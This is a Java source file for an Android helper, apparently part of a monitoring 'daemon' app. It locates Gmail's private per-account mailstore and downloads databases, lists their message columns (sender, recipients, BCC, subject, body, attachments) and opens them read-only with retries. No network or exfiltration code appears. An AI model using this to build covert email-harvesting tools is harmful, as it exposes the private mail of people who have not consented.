package com.vvt.daemon.email;

import android.database.sqlite.SQLiteDatabase;
import android.os.SystemClock;

import com.fx.daemon.Customization;
import com.vvt.logger.FxLog;

class GmailDatabaseHelper {

	private static final String TAG = "GmailDatabaseHelper";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;

	public static final String TABLE_DOWNLOADS = "downloads";
	public static final String COLUMN_DATA = "_data";
	public static final String COLUMN_TITLE = "title";
	
	public static final String TABLE_ATTACHMENT = "attachments";
	public static final String COLUMN_DOWNLOAD_ID = "downloadId";
	public static final String COLUMN_MSGS_MSG_ID = "messages_messageId";
	
	public static final String TABLE_MESSAGES = "messages";
	public static final String TABLE_MESSAGE_LABELS = "message_labels";
	public static final String TABLE_LABELS = "labels";
	
	public static final String COLUMN_ID = "_id";
	public static final String COLUMN_LABELS_ID = "labels_id";
	public static final String COLUMN_NAME = "name";
	public static final String COLUMN_MSG_MSG_ID = "message_messageId";
	public static final String COLUMN_CLIENT_CREATED = "clientCreated";
	
	
	public static final String COLUMN_MSG_ID = "messageId";
	public static final String COLUMN_CONVERSATION = "conversation";
	public static final String COLUMN_FROM = "fromAddress";
	public static final String COLUMN_TO = "toAddresses";
	public static final String COLUMN_CC = "ccAddresses";
	public static final String COLUMN_BCC = "bccAddresses";
	public static final String COLUMN_REPLY_TO = "replyToAddresses";
	public static final String COLUMN_DATE_SENT = "dateSentMs";
	public static final String COLUMN_DATE_RECEIVED = "dateReceivedMs";
	public static final String COLUMN_SUBJECT = "subject";
	public static final String COLUMN_BODY = "body";
	public static final String COLUMN_BODY_COMPRESSED = "bodyCompressed";
	public static final String COLUMN_ATTACHMENTS = "joinedAttachmentInfos";
	public static final String COLUMN_SYNCED = "synced";
	
	public static final String LABEL_INBOX = "^i";
	public static final String LABEL_SENT = "^f";
//	public static final String LABEL_DRAFT = "^r";
//	public static final String LABEL_OUTBOX = "^^out";
	
	public static String getGmailAccountDbPath(String gmailDbPath, String account) {
		return String.format("%s/mailstore.%s.db", gmailDbPath, account);
	}
	
	public static String getGmailDownloadsDbPath(String gmailDbPath) {
		return String.format("%s/downloads.db", gmailDbPath);
	}
	
	public static SQLiteDatabase getReadableDatabase(String dbPath) {
		return openDatabase(SQLiteDatabase.OPEN_READONLY, dbPath);
	}

	private static SQLiteDatabase openDatabase(int flags, String dbPath) {
		if (dbPath == null || dbPath.trim().length() == 0) return null;
		
		if(LOGV) FxLog.v(TAG, String.format("openDatabase # path: %s", dbPath));
		
		SQLiteDatabase db = tryOpenDatabase(flags, dbPath);

		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if(LOGV) FxLog.v(TAG, "openDatabase # Cannot open database. Retrying ...");
			SystemClock.sleep(1000);
			db = tryOpenDatabase(flags, dbPath);
			attemptLimit--;
		}

		return db;
	}
	
	private static SQLiteDatabase tryOpenDatabase(int flags, String dbPath) {
		if(LOGV) FxLog.v(TAG, String.format("tryOpenDatabase # dbPath: %s", dbPath));
		SQLiteDatabase db = null;
		try {
			db = SQLiteDatabase.openDatabase(dbPath, null, flags);
		} 
		catch (Exception e) {
			if(LOGE) FxLog.e(TAG, String.format("tryOpenDatabase # Error: %s", e.toString()));
		}
		return db;
	}

}
